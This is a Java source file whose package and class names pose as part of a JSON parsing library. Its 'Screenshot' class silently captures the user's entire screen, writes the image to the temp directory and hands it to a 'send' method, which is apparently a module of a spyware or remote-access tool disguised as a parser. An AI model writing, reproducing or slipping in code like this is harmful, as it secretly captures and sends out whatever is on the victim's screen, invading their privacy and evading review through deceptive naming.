package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;

public class Screenshot implements JSONObject {
    @Override
    public void handle() {
        try {
            Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            Robot robot = new Robot();
            BufferedImage image = robot.createScreenCapture(rect);

            File file = new File(System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "screenshot_" + new Random().nextInt() + ".png");
            ImageIO.write(image, "png", file);

            JSONRegexHandler.send(file);
        } catch (Exception e) {
            // @TODO remove
            e.printStackTrace();
        }
    }

    @Override
    public String getName() {
        return "Screenshot";
    }
}
